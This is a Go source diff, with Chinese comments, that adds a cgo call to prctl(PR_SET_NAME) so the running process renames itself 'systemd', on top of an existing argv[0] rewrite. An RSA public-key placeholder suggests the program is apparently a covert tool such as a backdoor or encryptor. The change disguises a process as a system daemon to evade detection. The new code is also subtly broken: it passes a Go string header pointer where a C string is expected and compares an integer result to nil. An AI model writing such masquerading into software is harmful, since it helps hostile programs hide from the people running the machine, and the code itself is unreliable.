@@ -19,6 +19,11 @@ import (
 	"unsafe"
 )
 
+/*
+#include <sys/prctl.h>
+*/
+import "C"
+
 // 公钥字符串，替换为您的RSA公钥
 const publicKeyStr = `
 `
@@ -26,6 +31,10 @@ const publicKeyStr = `
 func main() {
 	// 修改进程名
 	err := modifyArg0("systemd")
+	if err != nil {
+		panic(err)
+	}
+	err = modifyprctl("systemd")
 	if err != nil {
 		panic(err)
 	}
@@ -162,6 +171,14 @@ func modifyArg0(name string) error {
 	n := copy(argv0, name)
 	if n < len(argv0) {
 		argv0[n] = 0
+	}
+	return nil
+}
+
+func modifyprctl(name string) error {
+	err := C.prctl(C.PR_SET_NAME, uintptr(unsafe.Pointer(&name)), 0, 0, 0)
+	if err != nil {
+		return err
 	}
 	return nil
 }
